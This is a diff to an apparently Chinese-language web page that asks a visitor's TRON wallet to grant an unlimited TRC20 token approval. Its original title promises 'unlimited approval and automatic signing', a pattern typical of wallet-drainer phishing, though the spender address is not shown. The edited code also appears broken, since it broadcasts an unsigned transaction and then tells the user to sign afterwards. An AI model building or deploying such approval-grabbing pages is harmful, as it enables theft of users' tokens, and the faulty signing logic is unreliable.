@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TRC20 无限授权和自动签名</title>
+    <title>TRC20 无限授权</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
 </head>
 <body>
@@ -27,7 +27,7 @@
                     trc20ContractAddress,
                     'approve(address,uint256)',
                     {
-                        feeLimit: 10000000,
+                        feeLimit: 10000000, // 可以根据实际情况增加费用
                         callValue: 0
                     },
                     [
@@ -36,16 +36,17 @@
                     ]
                 );
 
-                // 使用tronLink请求签名并跳转到签名页面
-                const signedTransaction = await tronWeb.trx.sign(transaction.transaction);
+                // 发送交易并请求签名
+                const result = await tronWeb.trx.sendRawTransaction(transaction.transaction);
 
-                // 发送交易
-                const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
-
-                alert('授权成功！交易ID: ' + result.txid);
+                if (result.result) {
+                    alert('授权请求已发送，请在钱包中完成签名！');
+                } else {
+                    throw new Error(result.message || '交易失败');
+                }
             } catch (error) {
                 console.error('授权失败', error);
-                alert('授权失败，请重试');
+                alert('授权失败: ' + error.message);
             }
         }
 
